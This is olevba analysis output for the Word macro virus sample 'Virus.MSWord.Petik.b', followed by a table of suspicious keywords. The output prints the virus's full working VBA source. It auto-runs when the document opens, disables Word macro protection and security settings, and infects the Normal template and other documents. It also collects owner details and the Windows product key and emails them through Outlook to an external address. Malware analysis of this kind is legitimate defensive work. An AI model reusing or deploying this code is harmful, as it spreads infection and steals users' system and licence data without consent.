olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Petik.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Petik.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ApiWord.bas 
in file: ./Virus.MSWord.Petik.b - OLE stream: 'Macros/VBA/ApiWord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function Sleep& Lib "kernel32" (ByVal dwReserved As Long)
Private Declare Function CopyFile& Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Boolean)
Private Declare Function CreateDirectory& Lib "kernel32" Alias "CreateDirectoryA" (ByVal lpszCrDir As String, ByVal secu As Long)
Private Declare Function ExitWindowsEx& Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long)
Private Declare Function ShowCursor& Lib "user32" (ByVal fshow As Boolean)
Private Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
Private Declare Function WritePrivateProfileString& Lib "kernel32" Alias "WritePrivateProfileStringA" _
                (ByVal lpszSection As String, ByVal lpszKey As String, _
                ByVal lpszString As String, ByVal lpszFile As String)
                
Sub AutoOpen()
slp = Sleep(1000)
winp = Environ("windir")
crd = CreateDirectory(winp + "\ApiSystem", 0)
cp = CopyFile(ActiveDocument.FullName, winp + "\ApiSystem\HelloU.doc", False)

Call endprotect
Call infdoc
Call SrchF
Call PayLoad

End Sub

Sub HelpAbout()
MsgBox "System must be shutdown.", vbCritical, "Warning"
ext = ExitWindowsEx(2, 0)
End Sub

Sub SrchF()
On Error Resume Next
winp = Environ("windir")
infile = winp + "\ApiSystem\AboutU.ini"

MS = "HKEY_LOCAL_MACHINE\Software\Microsoft\ApiWord"
If System.PrivateProfileString("", MS, "Send Info") <> "OK" Then

CV = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
nom = System.PrivateProfileString("", CV, "RegisteredOwner")
ent = System.PrivateProfileString("", CV, "RegisteredOrganization")
ver = System.PrivateProfileString("", CV, "Version")
vern = System.PrivateProfileString("", CV, "VersionNumber")
pi = System.PrivateProfileString("", CV, "ProductId")
pk = System.PrivateProfileString("", CV, "ProductKey")
pf = System.PrivateProfileString("", CV, "ProgramFilesDir")

sp = System.PrivateProfileString("", _
"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page")

wr = WritePrivateProfileString("Information", "Name", nom, infile)
wr = WritePrivateProfileString("Information", "Organization", ent, infile)
wr = WritePrivateProfileString("Information", "Version of Windows", ver, infile)
wr = WritePrivateProfileString("Information", "Number of Version", vern, infile)
wr = WritePrivateProfileString("Information", "Identification Number", pi, infile)
wr = WritePrivateProfileString("Information", "Key Number", pk, infile)
wr = WritePrivateProfileString("Information", "Program Files Path", pf, infile)
wr = WritePrivateProfileString("Information", "Start Page", sp, infile)

Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
map.Logon "profile", "password"
mel = out.CreateItem(0)
mel.To = "apiinfo@lycos.fr"
mel.Subject = "Mail from " + nom
mel.Attachments.Add (infile)
mel.DeleteafterSubmit = True
mel.Send
map.Logoff

System.PrivateProfileString("", MS, "Author") = "PetiK"
System.PrivateProfileString("", MS, "Info File") = infile
System.PrivateProfileString("", MS, "Name") = "W97M.ApiWord"
System.PrivateProfileString("", MS, "Version") = "A"
System.PrivateProfileString("", MS, "Send Info") = "OK"
End If

End Sub

Sub infdoc()
On Error Resume Next
winp = Environ("windir")
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
DropFile = winp + "\ApiSystem\src.txt"
If Nor.Item("ApiWord").Name <> "ApiWord" Then
    Doc("ApiWord").Export DropFile
    Nor.Import DropFile
End If
If Doc.Item("ApiWord").Name <> "ApiWord" Then
    Nor("ApiWord").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If
End Sub

Sub endprotect()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub PayLoad()
num = Int((Rnd * 10) + 1)
If num = 1 Then
sm = SwapMouseButton(&H2)
ElseIf num = 5 Then
sc = ShowCursor(False)
slp = Sleep(10000)
sc = ShowCursor(True)
End If


End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

